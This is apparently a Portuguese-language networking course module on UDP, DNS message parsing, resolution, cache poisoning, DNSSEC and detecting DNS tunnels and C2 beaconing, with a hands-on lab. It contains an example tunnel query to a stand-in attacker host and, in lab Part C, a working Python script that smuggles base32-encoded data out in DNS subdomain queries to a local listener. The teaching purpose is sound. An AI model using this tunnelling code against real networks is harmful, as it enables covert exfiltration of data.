# Módulo 5 — UDP, DNS e o Caminho do Nome

**Carga:** 3 horas (1h teoria · 2h lab)
**Pré-requisitos:** Módulos 1 a 4

---

## Objetivos

1. Explicar o que UDP faz e o que ele deliberadamente não faz.
2. Ler o payload de DNS em hexadecimal, campo por campo.
3. Traçar a resolução de um nome, do cache local ao servidor autoritativo.
4. Entender envenenamento de cache DNS e por que DNSSEC existe.
5. Reconhecer em captura os padrões de DNS que indicam túnel, C2 ou exfiltração.

---

## ⚠ Ética

DNS é o protocolo mais abusado para exfiltração, e este módulo mostra por quê. Entender o
mecanismo é necessário para defender.

⚠ **A linha:** você consulta e captura DNS do **seu** resolvedor e dos seus domínios. Consultar
DNS de terceiro de forma sistemática, ou operar túnel DNS contra infraestrutura que não é sua,
é crime — e o art. 154-A do Código Penal não faz exceção para "só era DNS". Labs usam um
`dnsmasq` local no seu laboratório.

---

## 5.1 UDP: o protocolo mínimo

UDP (RFC 768) tem header de **8 bytes**. É isso.

```
┌────────────────────┬────────────────────┐
│ Porta origem (16)  │ Porta destino (16) │
├────────────────────┼────────────────────┤
│ Comprimento (16)   │ Checksum (16)      │
└────────────────────┴────────────────────┘
```

Compare com TCP: 20 bytes, handshake, janela, retransmissão, ordenação, congestion control.
**UDP não tem nada disso.** Ele entrega o datagrama à camada IP e pronto.

### O que UDP não faz — e por que é a escolha certa para certas coisas

| Não faz | Consequência |
|---|---|
| Não abre conexão | Sem handshake, sem RTT inicial |
| Não confirma entrega | Perda é silenciosa |
| Não ordena | Chega fora de ordem, e pronto |
| Não retransmite | É trabalho da aplicação |
| Não controla fluxo | Pode inundar o receptor |
| Não controla congestão | Cuidado: pode afogar a rede |

**E é exatamente por isso que DNS usa UDP.** Consulta DNS é uma pergunta pequena e uma resposta
pequena. Montar handshake TCP custaria 3 RTTs antes de qualquer dado — inaceitável para algo que
precisa ser rápido e que a aplicação já resolve sozinha (retransmite se não veio resposta).

### Quando UDP é a escolha certa

| Aplicação | Por quê |
|---|---|
| DNS | Pergunta/resposta, retransmissão na aplicação |
| DHCP | Antes de ter IP, não pode fazer TCP |
| NTP | Timestamp é sensível a latência |
| VoIP / vídeo | Perder um frame é melhor que atrasar |
| QUIC (HTTP/3) | Reimplementa confiabilidade **melhor** que o TCP, na aplicação |
| SNMP | Simples e periódico |

⚠ **O tempo é o motivo por trás de metade dessas escolhas.** Em VoIP, retransmitir um pacote
perdido de 100ms atrás é pior que não ter o pacote: ele chegaria tarde demais e viraria ruído.
A aplicação prefere esquecer.

### Portas UDP que você precisa reconhecer

| Porta | Serviço |
|---|---|
| 53 | DNS |
| 67/68 | DHCP |
| 69 | TFTP |
| 123 | NTP |
| 161/162 | SNMP |
| 500/4500 | IPsec (IKE) |
| 443 | QUIC (HTTP/3) — **sim, 443 em UDP** |

⚠ **443/UDP é QUIC.** Se você vê tráfego para 443/UDP e assume "é HTTP comum", erra. QUIC
trafega num protocolo próprio sobre UDP, e a maior parte das ferramentas antigas não o disseca.

---

## 5.2 DNS: anatomia de uma mensagem

DNS (RFC 1034/1035) tem um formato binário compacto. Vamos ler um de verdade.

### A estrutura

```
┌─────────────────────────────────────────────┐
│ Header (12 bytes)                           │
├─────────────────────────────────────────────┤
│ Question section (a pergunta)               │
├─────────────────────────────────────────────┤
│ Answer section (as respostas)               │
├─────────────────────────────────────────────┤
│ Authority section (quem é autoritativo)     │
├─────────────────────────────────────────────┤
│ Additional section (informação extra)       │
└─────────────────────────────────────────────┘
```

### O header: 12 bytes que dizem tudo

```
 0                   1
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5
┌───────┬───────┬───────────────┐
│  ID (16 bits)                 │  ← correlaciona pergunta e resposta
├───────┬───────────────────────┤
│ QR│Op │AA│TC│RD│RA│Z │RCODE   │  ← flags
├───────┴───────────────────────┤
│ QDCOUNT                       │  ← quantas perguntas
│ ANCOUNT                       │  ← quantas respostas
│ NSCOUNT                       │  ← quantos registros de autoridade
│ ARCOUNT                       │  ← quantos registros adicionais
└───────────────────────────────┘
```

| Flag | Significado |
|---|---|
| **QR** | 0 = pergunta, 1 = resposta |
| **Opcode** | 0 = query padrão, 5 = update |
| **AA** | Authoritative Answer — este servidor é dono da zona |
| **TC** | Truncated — resposta não coube em 512 bytes, **repita sobre TCP** |
| **RD** | Recursion Desired — o cliente pede recursão |
| **RA** | Recursion Available — o servidor oferece recursão |
| **RCODE** | 0=OK, 3=NXDOMAIN, 2=SERVFAIL, 5=REFUSED |

### Leitura de uma captura

```bash
sudo tcpdump -i eth0 -nn -vvv 'udp port 53'
```

```
15:01:22.441234 IP 10.10.10.20.54321 > 10.10.10.1.53: 0x1a2b+ A? exemplo.lab. (29)
15:01:22.442001 IP 10.10.10.1.53 > 10.10.10.20.54321: 0x1a2b 1/1/1 A 10.10.10.10 (45)
```

Leia campo a campo:

| Trecho | Significado |
|---|---|
| `0x1a2b` | **ID da transação** — igual nos dois pacotes, correlaciona |
| `+` | **RD=1**: o cliente pediu recursão |
| `A?` | Tipo de pergunta: registro A (endereço IPv4) |
| `exemplo.lab.` | O nome, com ponto final (é o FQDN completo) |
| `(29)` | Tamanho da mensagem DNS |
| `1/1/1` | ANCOUNT/NSCOUNT/ARCOUNT: 1 resposta, 1 autoridade, 1 adicional |
| `A 10.10.10.10` | A resposta |

### Lendo o payload em hexadecimal

```bash
sudo tcpdump -i eth0 -nn -X 'udp port 53 and udp[10] & 0x80 == 0' -c 1
```

Pegando a pergunta, o payload DNS começa em offset 42 do quadro Ethernet (14 Ethernet + 20 IP
+ 8 UDP):

```
0x002a:  1a2b 0100 0001 0000 0000 0000        ← header
0x0036:  07 65 78 65 6d 70 6c 6f              ← "exemplo" (7 bytes)
0x003e:  03 6c 61 62 00                       ← "lab" (3 bytes) + terminator
0x0042:  0001 0001                            ← QTYPE=1 (A), QCLASS=1 (IN)
```

⚠ **O formato de nome do DNS é peculiar:** cada rótulo vem precedido pelo **comprimento**
(1 byte), e o nome termina com um byte `00` (raiz). `07 exemplo` + `03 lab` + `00` = `exemplo.lab.`

### E a compressão de nome?

Sim. Em respostas, o DNS usa um ponteiro para evitar repetir o nome: um valor cujos **dois bits
mais altos são `11`** (`0xC0`) indica "os 14 bits restantes são um offset dentro da mensagem".

```
0xc00c    ← "volte 12 bytes e leia o nome de lá"
```

**Isso é a origem de uma classe inteira de vulnerabilidades** — ponteiros circulares, offsets
fora dos limites, e nomes que se referenciam mutuamente causando loop. O parser precisa tratar.

---

## 5.3 O caminho do nome

O que acontece quando você digita um domínio. Vale entender, porque cada etapa é um lugar onde
algo pode falhar — e cada uma deixa rastro diferente.

```
1. /etc/nsswitch.conf diz a ordem: files, dns, ...
       ↓
2. /etc/hosts é consultado primeiro
       ↓
3. Cache do systemd-resolved / nscd (se houver)
       ↓
4. Resolvedor configurado em /etc/resolv.conf
       ↓
5. O resolvedor (recursivo) faz o trabalho:
       a. Consulta os root servers  → onde está .lab?
       b. Consulta o servidor de .lab → onde está exemplo.lab?
       c. Consulta o autoritativo → qual o A de exemplo.lab?
       ↓
6. Resposta volta, com TTL
       ↓
7. Cacheia pelo tempo do TTL
```

```bash
# Ver a ordem de resolução
cat /etc/nsswitch.conf | grep hosts
cat /etc/hosts
cat /etc/resolv.conf

# Ver o caminho completo com delegação
dig +trace exemplo.lab

# Ver SÓ a resposta
dig +short exemplo.lab

# Ver tudo que o servidor respondeu
dig exemplo.lab ANY
```

### Os tipos de registro que importam

| Tipo | O que é | Exemplo |
|---|---|---|
| **A** | Endereço IPv4 | `exemplo.lab. 300 IN A 10.10.10.10` |
| **AAAA** | Endereço IPv6 | `exemplo.lab. 300 IN AAAA 2001:db8::1` |
| **CNAME** | Apelido para outro nome | `www.lab. 300 IN CNAME exemplo.lab.` |
| **MX** | Servidor de e-mail | `lab. 300 IN MX 10 mail.lab.` |
| **NS** | Servidor de zona | `lab. 300 IN NS ns1.lab.` |
| **TXT** | Texto livre | SPF, DKIM, verificação de domínio |
| **SOA** | Autoridade da zona | Contém serial, TTLs, contato |
| **PTR** | Reverso (IP → nome) | `10.10.10.10.in-addr.arpa.` |
| **SRV** | Serviço específico | `_ldap._tcp.lab.` |

⚠ **TXT e o abuso que ele permite:** TXT aceita até 255 bytes de texto livre por registro, e
múltiplos registros. É o vetor preferido para túnel DNS e exfiltração — **um campo "livre" é um
canal**. Você vai ver isso na seção 5.5.

### TTL e por que ele importa em análise

O TTL do DNS é **quanto tempo o resolvedor pode guardar a resposta**, em segundos. O valor conta
histórias:

| TTL observado | O que sugere |
|---|---|
| 30–300 | Registro dinâmico, preparado para mudar rápido (failover, CDN) |
| 3600 | Padrão comum |
| 86400 | Estável, raramente muda |
| **TTL muito baixo e variável** | **Possível domínio gerado por algoritmo (DGA) ou C2 com rotação** |
| **TTL 0** | "Não cacheie" — comum em domínio de malware |

---

## 5.4 Envenenamento de cache e DNSSEC

### O problema

DNS, como ARP, não tinha autenticação no projeto original. Um resolvedor não tem como verificar
se a resposta realmente veio de quem deveria.

**Envenenamento de cache** significa colocar uma resposta falsa no cache de um resolvedor. A
partir daí, **todos os clientes daquele resolvedor** recebem o endereço falso — por todo o TTL.

**Como um ataque clássico funcionava (Kaminsky, 2008):**

```
1. Atacante faz muitas consultas a nomes aleatórios em alvo.com
2. Enquanto isso, inunda o resolvedor com respostas falsas
3. Precisa acertar o ID de transação (16 bits) e a porta de origem
4. Se acertar, o cache do resolvedor fica envenenado
```

**Defesas que reduziram isso:**

| Defesa | Como funciona |
|---|---|
| **Source port randomization** | Aleatoriza a porta UDP de origem, além do ID |
| **ID randomization** | Já existia, mas 16 bits só |
| **0x20 encoding** | Varia o caso das letras na pergunta; a resposta tem que bater |
| **DNSSEC** | Assinatura criptográfica das respostas |
| **Resolvedores do sistema operacional** | Resolvem localmente, reduzindo a janela |

### O que um cliente percebe

```bash
# Verificar se o resolvedor usa porta aleatória
for i in 1 2 3 4 5; do
    dig +short +time=1 @10.10.10.1 exemplo.lab > /dev/null
done
sudo tcpdump -nn 'udp port 53' -c 10 | grep '>' | awk '{print $5}' | sort -u
```

Se as portas de origem forem sequenciais, o resolvedor é previsível — e vale reclamar com quem
o opera.

### DNSSEC em uma frase

DNSSEC adiciona **assinaturas** aos registros. O resolvedor pode verificar que a resposta veio
da zona autoritativa e não foi alterada. Não cifra nada — só autentica.

```bash
dig +dnssec exemplo.lab
dig +short RRSIG exemplo.lab

# Verificar a cadeia de confiança
dig +dnssec +multi . DNSKEY
```

⚠ **DNSSEC não é a mesma coisa que DNS sobre HTTPS (DoH) nem DNS sobre TLS (DoT).** São
propriedades diferentes:

| | O que protege |
|---|---|
| **DNSSEC** | Autenticidade — a resposta é legítima |
| **DoT / DoH** | Confidencialidade — ninguém no caminho lê a consulta |

Você pode ter um sem o outro. DoH sem DNSSEC significa consultas cifradas até um resolvedor que
pode ter sido envenenado — mais privacidade, mesma vulnerabilidade de integridade.

---

## 5.5 DNS como canal: o que procurar na captura

DNS é abusado porque quase toda rede permite saída na porta 53. Isso faz dele o canal perfeito.

### Túnel DNS

Dado real é codificado em nomes de subdomínio, e o servidor autoritativo do domínio do atacante
decodifica:

```
consulta: 3f2a8b1c9d0e.dados.attacker.example
resposta: TXT com 200 bytes de dado de retorno
```

**Sinais na captura:**

| Sinal | O que indica |
|---|---|
| Nomes muito longos (> 50 caracteres por rótulo) | Codificação de dado |
| Rótulos com alta entropia / base32 / base64 | Dado binário codificado |
| **Muitas consultas ao mesmo domínio, subdomínio sempre diferente** | Canal de saída |
| Volume constante e contínuo (heartbeat) | C2 com beacon |
| Tipo de registro incomum (TXT, NULL, CNAME) | Transporte de dado |
| Consultas a um único domínio autoritativo desconhecido | Servidor C2 |
| Respostas maiores que as perguntas | Dado entrando |
| TTL 0 ou muito baixo | Evitar cache |
| **Ausência de consulta a outros domínios** | Host comprometido, falando só com o C2 |

### Detecção prática

```bash
# Captura só de DNS, com o nome completo
sudo tcpdump -i eth0 -nn -s0 'udp port 53' -c 200 | grep -oP 'A\? \K[^ ]+' | sort | uniq -c | sort -rn | head

# Frequência por domínio
tshark -r dns.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name \
  | awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn | head

# Tamanho médio dos nomes consultados
tshark -r dns.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name \
  | awk '{s+=length($0); n++} END {printf "média: %.1f caracteres (%d consultas)\n", s/n, n}'

# Entropia de um rótulo (aproximação)
python3 - <<'EOF'
import math, collections
for nome in ["www", "3f2a8b1c9d0e", "api", "aGVsbG8gd29ybGQ"]:
    c = collections.Counter(nome)
    e = -sum((n/len(nome)) * math.log2(n/len(nome)) for n in c.values())
    print(f"{nome:25} entropia={e:.2f}")
EOF
```

**Regra prática:** nome de host normal tem entropia baixa (`www`, `api`, `mail`). Base64 tem
entropia alta e frequentemente contém `+`, `/`, `=`. Combine com frequência alta no mesmo
domínio e você tem um forte indicador.

⚠ **Falso positivo é comum:** CDN usa subdomínio longo e randômico de propósito
(`d111111abcdef8.cloudfront.net`). **Sempre combine com contexto:** domínio desconhecido,
volume anômalo, histórico de tráfego.

### Beaconing — o padrão temporal

Malware costuma "chamar casa" em intervalo regular. Numa captura, isso aparece como periodicidade:

```bash
tshark -r dns.pcap -Y 'dns.flags.response == 0 and dns.qry.name contains "suspeito"' \
  -T fields -e frame.time_epoch | \
python3 -c "
import sys
t = [float(x) for x in sys.stdin]
d = [round(b-a, 2) for a, b in zip(t, t[1:])]
print('intervalos:', d[:20])
print('média:', round(sum(d)/len(d), 2) if d else 0)
print('desvio padrão:', round((sum((x-sum(d)/len(d))**2 for x in d)/len(d))**0.5, 2) if d else 0)
"
```

**Intervalo com desvio padrão muito baixo = comportamento automatizado.** Humano não consulta
DNS a cada 60,0 segundos. Isso mais um domínio desconhecido é achado.

### Jitter: a evasão

Malware moderno adiciona **jitter** — variação aleatória no intervalo — justamente para quebrar
essa detecção. O desvio padrão sobe, e a periodicidade some.

**O que continua detectável mesmo com jitter:**
- Domínio desconhecido, com tráfego constante.
- Nome de subdomínio longo de alta entropia.
- Ausência de padrão de navegação (sem outros domínios, sem CDN, sem conteúdo).
- Volume de DNS muito acima do perfil do host.

---

## 5.6 LAB — DNS de ponta a ponta

**Duração:** 120 min
**Objetivo:** ler DNS em hexadecimal, seguir a resolução e reconhecer padrão de túnel.

### Parte A — Lendo o hexdump (30 min)

```bash
mkdir -p ~/redes-lab/lab5 && cd ~/redes-lab/lab5

# Capture uma consulta real
sudo tcpdump -i eth0 -nn -X -s0 'udp port 53' -c 2 -w dns.pcap &
sleep 1
dig exemplo.lab > /dev/null 2>&1
dig google.com > /dev/null 2>&1
sleep 1

# Leia
tcpdump -r dns.pcap -nn -XX
```

Produza `dns-hex.md` com a leitura do primeiro pacote:

| Offset | Bytes | Campo | Valor interpretado |
|---|---|---|---|
| 0x002a | `1a2b` | ID de transação | ? |
| 0x002c | `0100` | Flags | ? |
| 0x002e | `0001` | QDCOUNT | ? |
| ... | ... | ... | ... |
| após o header | ... | Comprimento do primeiro rótulo | ? |
| ... | ... | Rótulo | ? |
| ... | ... | Terminador da raiz | `00` |

**Responda:** qual a flag RD? Qual o QTYPE? Como você sabe que é uma pergunta e não uma resposta?

### Parte B — Cadeia de resolução (30 min)

```bash
# Resolução completa
dig +trace exemplo.lab

# Comparação de tipos
dig exemplo.lab A
dig exemplo.lab AAAA
dig exemplo.lab ANY
dig exemplo.lab MX
dig exemplo.lab TXT

# Reverso
dig -x 10.10.10.10

# Você consegue medir o tempo de cada etapa?
time dig +trace exemplo.lab > /dev/null
time dig +short exemplo.lab > /dev/null
```

Responda em `cadeia.md`:

1. Quantos saltos a resolução completa percorreu? De quais servidores?
2. Qual a diferença de tempo entre a resolução completa e a consulta cacheada?
3. O que o `AA` flag indicou? Em qual resposta ele apareceu?
4. O `PTR` de `10.10.10.10` retornou algo? Por que frequentemente **não** retorna?
5. **O que a flag `TC` significaria aqui?** Provocar: uma resposta maior que 512 bytes.

```bash
# Provoca resposta grande
dig +bufsize=0 exemplo.lab ANY
sudo tcpdump -nn 'udp port 53 or tcp port 53' -c 20
```

### Parte C — Simular túnel DNS no laboratório (60 min)

**Isto roda inteiramente no seu laboratório, contra um servidor seu.** Não aponte para fora.

```bash
# No alvo: capturador de DNS que loga os nomes consultados
sudo python3 - <<'EOF' &
import socket, struct

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("0.0.0.0", 5353))

def parse_qname(data, off):
    labels = []
    while data[off] != 0:
        n = data[off]
        labels.append(data[off+1:off+1+n].decode('latin1'))
        off += 1 + n
    return ".".join(labels), off + 1

print("capturador DNS escutando em 0.0.0.0:5353")
while True:
    data, addr = s.recvfrom(4096)
    try:
        _, flags, qd, _, _, _ = struct.unpack("!HHHHHH", data[:12])
        if qd > 0:
            nome, _ = parse_qname(data, 12)
            print(f"consulta: {nome}  ({len(nome)} chars)  de {addr[0]}")
    except Exception as e:
        print(f"erro ao parsear: {e}")
EOF
```

**No cliente,** simule o padrão:

```bash
# 1. Consultas normais
for n in www api mail; do
    dig +short @10.10.10.10 -p 5353 "$n.lab" > /dev/null 2>&1
done

# 2. Simule túnel: dado em base32 no subdomínio
python3 - <<'EOF' &
import base64, random, socket, time
dados = b"EXFIL-DE-DADOS-DE-TESTE-DO-LABORATORIO-REDES"
def codifica(b):
    return base64.b32encode(b).decode().lower().strip("=")

for i in range(0, len(dados), 8):
    chunk = codifica(dados[i:i+8])
    nome = f"{chunk}.dados.lab"
    # Consulta direta ao nosso capturador
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.sendto(b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
                 b"".join(bytes([len(l)]) + l.encode() for l in nome.split(".")) +
                 b"\x00\x00\x01\x00\x01", ("10.10.10.10", 5353))
        s.recvfrom(512)
        s.close()
    except socket.timeout:
        pass
    time.sleep(0.1)
    print(f"enviado: {nome}  ({len(nome)} chars)")
EOF
sleep 3
```

**Analise o que o capturador registrou:**

```bash
# Capture tudo enquanto isso
sudo tcpdump -i eth0 -nn -s0 -X 'udp port 5353' -w tunel.pcap -c 100 &
```

Produza `tunel.md` respondendo:

1. Qual a diferença de comprimento entre os nomes normais (`www.lab`) e os de túnel?
2. Calcule a **entropia** de cada um. Compare.
3. Quantas consultas foram feitas em quantos segundos? Qual o intervalo?
4. **Escreva a regra de detecção** que você usaria: quais critérios combinados identificariam
   esse padrão numa captura de 24h?
5. Que **falsos positivos** essa regra geraria numa rede real? Cite dois casos legítimos que
   se parecem com túnel.

### Critérios de aceitação

- `dns-hex.md` tem o primeiro pacote lido com no mínimo 10 campos e seus offsets.
- Você identificou RD, QTYPE e o terminator da raiz no hexdump.
- `cadeia.md` responde as cinco perguntas com as saídas anexadas.
- Você provocou a flag `TC` e explicou o que ela faz o cliente fazer.
- `tunel.md` tem os nomes normais e de túnel com a **entropia calculada** de cada um.
- Você escreveu uma regra de detecção com pelo menos três critérios combinados.
- Você nomeou dois falsos positivos plausíveis para essa regra.
- Nada foi apontado para fora de `10.10.10.0/24`.

---

## Avaliação

1. Desenhe o header UDP. Por que ele tem 8 bytes e o TCP tem no mínimo 20?
2. Cite três aplicações que usam UDP e explique, para cada uma, por que a ausência de
   retransmissão é uma vantagem e não um defeito.
3. Por que 443/UDP é QUIC e não HTTP?
4. Descreva os campos do header DNS. Qual flag diz se é pergunta ou resposta?
5. Como o DNS representa um nome binariamente? Descreva o formato de rótulo e terminator.
6. O que `0xc00c` significa numa resposta DNS? Por que isso gera risco de segurança?
7. Explique por que o campo TXT é o vetor preferido para exfiltração por DNS.
8. Um host faz 200 consultas em 10 minutos, todas para `a1b2c3.tunnel.example`, com nomes de
   60 caracteres e TTL 0. **Que conclusão você tira e que evidência sustenta?**
9. O que é jitter e por que malware moderno o usa?
10. Diferencie DNSSEC de DNS sobre HTTPS. Que propriedade cada um garante, e por que ter um não
    implica ter o outro?
11. Cite dois falsos positivos que se parecem com túnel DNS em rede corporativa legítima.
12. Por que a flag `TC` existe e o que o cliente faz ao recebê-la?

---

**Próximo:** [Módulo 6 — `tcpdump` na prática](modulo-06.md)
